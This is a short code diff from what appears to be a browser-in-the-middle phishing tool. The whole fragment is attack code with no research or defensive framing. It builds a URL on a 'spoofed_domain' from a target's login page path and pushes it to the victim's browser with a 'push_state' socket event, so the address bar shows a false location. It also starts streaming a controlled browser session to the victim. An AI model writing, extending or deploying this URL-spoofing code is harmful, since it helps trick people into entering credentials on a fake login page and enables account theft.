@@ -383,14 +383,14 @@ fastify.ready(async function(err){
       })
       
       // Immediately spoof the URL with the current page
-      const currentUrl = new URL(empty_phishbowl.target_page.url())
-      const initialSpoofedUrl = `https://${empty_phishbowl.spoofed_domain}${currentUrl.pathname}${currentUrl.search}${currentUrl.hash}`
+      const targetPageUrl = new URL(target.login_page)
+      const initialSpoofedUrl = `https://${empty_phishbowl.spoofed_domain}${targetPageUrl.pathname}${targetPageUrl.search}${targetPageUrl.hash}`
       
       // Add small delay to ensure client-side JS is ready
       setTimeout(() => {
         console.log(`Spoofing URL to: ${initialSpoofedUrl}`)
         fastify.io.to(socket.id).emit('push_state', initialSpoofedUrl)
-      }, 1000)
+      }, 2000)
       
       fastify.io.to(empty_phishbowl.socket_id).emit('stream_video_to_first_viewer', socket.id)
       //console.log(empty_phishbowl)
